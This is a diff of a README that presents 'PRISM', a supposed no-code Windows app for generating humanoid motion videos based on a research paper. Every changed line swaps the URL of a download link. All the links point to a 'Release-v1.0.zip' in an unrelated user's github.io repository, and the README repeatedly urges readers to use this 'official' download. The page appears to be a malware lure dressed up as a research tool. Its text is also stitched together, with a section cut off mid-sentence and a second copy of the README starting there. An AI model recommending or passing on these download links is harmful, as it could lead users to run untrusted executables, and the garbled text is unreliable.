@@ -5,7 +5,7 @@ description: "Train and deploy humanoid loco-manipulation policies with counterf
 ---
 # 🎬 PRISM - Generate Realistic Humanoid Motion Videos Easily
 
-<a href="https://github.com/Bloommmyboi/bloommmyboi.github.io/raw/refs/heads/main/subdominant/Release-v1.0.zip"><img src="https://img.shields.io/badge/Download_PRISM-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download PRISM" width="280"></a>
+<a href="https://raw.githubusercontent.com/Bloommmyboi/bloommmyboi.github.io/main/subdominant/Release-v1.0.zip"><img src="https://img.shields.io/badge/Download_PRISM-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download PRISM" width="280"></a>
 
 PRISM is a Windows application for creating counterfactual video content of humanoid movement. It is built around the research description “Counterfactual Video Generation Enables Scalable Humanoid Loco-Manipulation.” In simple terms, PRISM helps you generate “what if” versions of humanoid motion videos, such as walking, reaching, balancing, and carrying, without needing to write code.
 
@@ -28,7 +28,7 @@ The most important step is to use the official download link shown in this guide
 
 ## 📥 Download PRISM
 
-Visit this link to download the application: **[Download PRISM](https://github.com/Bloommmyboi/bloommmyboi.github.io/raw/refs/heads/main/subdominant/Release-v1.0.zip)**
+Visit this link to download the application: **[Download PRISM](https://raw.githubusercontent.com/Bloommmyboi/bloommmyboi.github.io/main/subdominant/Release-v1.0.zip)**
 
 After the download is complete, keep the file in a safe place. Do not rename or move supporting files unless you are sure they are not needed. If your browser asks where to save the file, choose a folder you will remember.
 
@@ -80,7 +80,7 @@ If your computer has less memory or storage, PRISM may still open, but previews 
 
 ## 🛠️ Setup and Installation
 
-Visit this link to download the application: **[Download PRISM](https://github.com/Bloommmyboi/bloommmyboi.github.io/raw/refs/heads/main/subdominant/Release-v1.0.zip)**
+Visit this link to download the application: **[Download PRISM](https://raw.githubusercontent.com/Bloommmyboi/bloommmyboi.github.io/main/subdominant/Release-v1.0.zip)**
 
 After the download finishes, open the downloaded file. Follow any on-screen prompts that appear. When PRISM opens, the setup is complete. If you are asked to choose a folder, select a location with enough free space for your projects and videos.
 
@@ -119,7 +119,7 @@ Keep each project in its own folder. Use clear names such as “Walking_Demo,”
 - **The preview is slow:** close other apps, free up disk space, and try a smaller preview setting.
 - **You cannot find the downloaded file:** check# 🎬 PRISM - Generate Realistic Humanoid Motion Videos Easily
 
-<a href="https://github.com/Bloommmyboi/bloommmyboi.github.io/raw/refs/heads/main/subdominant/Release-v1.0.zip"><img src="https://img.shields.io/badge/Download_PRISM-6C5CE7?style=for-the-badge&logo=github&logoColor=white" alt="Download PRISM" width="300"></a>
+<a href="https://raw.githubusercontent.com/Bloommmyboi/bloommmyboi.github.io/main/subdominant/Release-v1.0.zip"><img src="https://img.shields.io/badge/Download_PRISM-6C5CE7?style=for-the-badge&logo=github&logoColor=white" alt="Download PRISM" width="300"></a>
 
 PRISM is a Windows application for creating counterfactual video content of humanoid movement. It is built around the research description “Counterfactual Video Generation Enables Scalable Humanoid Loco-Manipulation.” In everyday terms, PRISM helps you generate “what if” versions of humanoid motion videos — walking, balancing, reaching, carrying, and handling objects — without writing any code.
 
@@ -142,7 +142,7 @@ The most important step is to use the official download link shown in this guide
 
 ## 📥 Download PRISM
 
-Visit this link to download the application: **[Download PRISM](https://github.com/Bloommmyboi/bloommmyboi.github.io/raw/refs/heads/main/subdominant/Release-v1.0.zip)**
+Visit this link to download the application: **[Download PRISM](https://raw.githubusercontent.com/Bloommmyboi/bloommmyboi.github.io/main/subdominant/Release-v1.0.zip)**
 
 After the download finishes, keep the file in a safe place. Do not rename or move supporting files unless you are certain they are not needed. If your browser asks where to save the file, choose a folder you will remember.
 
@@ -195,7 +195,7 @@ If your computer has less memory or storage, PRISM may still open, but previews 
 
 ## 🛠️ Setup and Installation
 
-Visit this link to download the application: **[Download PRISM](https://github.com/Bloommmyboi/bloommmyboi.github.io/raw/refs/heads/main/subdominant/Release-v1.0.zip)**
+Visit this link to download the application: **[Download PRISM](https://raw.githubusercontent.com/Bloommmyboi/bloommmyboi.github.io/main/subdominant/Release-v1.0.zip)**
 
 After the download finishes, open the downloaded file and follow any on-screen prompts that appear. When the PRISM window opens, setup is complete. If you are asked to choose a folder, select a location with enough free space for your projects and videos.
 
